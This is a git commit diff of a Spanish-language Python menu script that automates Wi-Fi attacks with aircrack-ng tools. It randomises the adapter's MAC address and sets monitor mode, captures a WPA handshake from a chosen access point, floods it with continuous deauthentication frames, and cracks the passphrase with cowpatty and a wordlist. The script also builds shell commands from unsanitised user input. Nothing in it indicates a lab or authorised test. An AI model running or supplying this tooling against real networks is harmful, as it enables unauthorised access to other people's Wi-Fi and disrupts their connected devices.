aca69e812e448976f8e31f7799c45fef4a3afa63
David <sotodelanoche@gmail.com>
2020-07-27 20:10:44 +0000

    Update bacaa_loca.py

--- bacaa_loca.py
+++ bacaa_loca.py
@@ -20,7 +20,7 @@ print("\033[1;37;1m ")
 
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-listamenu=["opciones:","1) selec Wlan & changer Mac" ,"2) Scaner red ", "3) capture", "4) crack", "5) Exit"]#Menu Princcipal
+listamenu=["Opciones:","1) Scaner red ", "2) Capture", "3) Crack", "4) Exit"]#Menu Princcipal
 key=0
 exit=False
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -30,69 +30,59 @@ def menu():
 	print(listamenu[2])
 	print(listamenu[3])
 	print(listamenu[4])
-	print(listamenu[5])
+
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-def config():
-	global wlan
-	while True:
-		try:
-			os.system("ifconfig")
-			wlan=input("Introduzca Wlan: ")
-			print("Procesando")
-			os.system('ip link set '+wlan+' up')
-			os.system('airmon-ng check kill')
-			os.system('ifconfig '+wlan+' down')
-			os.system('macchanger -A '+wlan)
-			os.system('ifconfig '+wlan+' up') 
-			os.system('airmon-ng start '+wlan)
-			return wlan
-			break
-		except TypeError:
-			print("Wlan no permitida")
-
-def scan(wlan):
+def scan():
+	global essid
 	global bssid
 	global canal
 	global diccionario
-	os.system('wash -i '+wlan)
+	time_scan=input("Seleccione tiempo de escaneo default 60 : ")
+	if(time_scan==''):
+		time_scan="60"
+	os.system('nmcli -w '+time_scan+' device wifi list')
+	essid=input("seleccione SSID : ")
 	bssid=input("seleccione BSSID : ")
 	canal=input("seleccione CHANEL : ")
-	diccionario=input("Introduzca ruta diccionario :")
-	return bssid,canal
+	diccionario=input("Introduzca ruta diccionario .lts:")
+	return essid,canal,bssid, diccionario
 
-def attack(wlan,bssid,canal):
+def attack(bssid,canal):
+	os.system("ifconfig")
+	wlan=input("Introduzca Wlan: ")
+	print("Procesando")
+	os.system('airmon-ng check kill')
+	os.system('ifconfig '+wlan+' down')
+	os.system('macchanger -A '+wlan)
+	os.system('ifconfig '+wlan+' up') 
+	os.system('airmon-ng start '+wlan)
+	print(wlan)
 	os.system('x-terminal-emulator -e airodump-ng --bssid '+bssid+' -c '+canal+' -w cowpatty '+wlan)
 	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')
 
 
-def crack(bssid,diccionario):
-		os.system('x-terminal-emulator -e cowpatty -r /root/Especial_termux_kali/cowpatty-01.cap -f '+diccionario+' -s '+bssid)
-
-
+def crack(essid,diccionario):
+	os.system('x-terminal-emulator -e cowpatty -f '+diccionario+' -r /root/Especial_termux_kali/cowpatty-01.cap -s '+essid)
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 while exit==False:
 	menu()
 	key=(int(input()))
 	if (key==1):
-		config()
-		print(wlan)
+		scan()
 	elif (key==2):
-		scan(wlan)
+		attack(bssid,canal)
 	elif (key==3):
-		attack(wlan,bssid,canal)
+		crack(essid,diccionario)
 	elif (key==4):
-		crack(bssid,diccionario)
-	elif (key==5):
-		
-		#os.syste('airmon-ng stop wlan0mon')
-		#os.syste('ifconfig wlan0 down')
-		#os.syste('iwconfig wlan0 mode managed')
-		#os.syste('ifconfig wlan0 up')
-		#os.system('service network-manager start')
+		os.system('airmon-ng stop wlan0mon')
+		os.system('ifconfig wlan0 down')
+		os.system('iwconfig wlan0 mode managed')
+		os.system('ifconfig wlan0 up')
+		os.system('service network-manager start')
 		exit=True
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
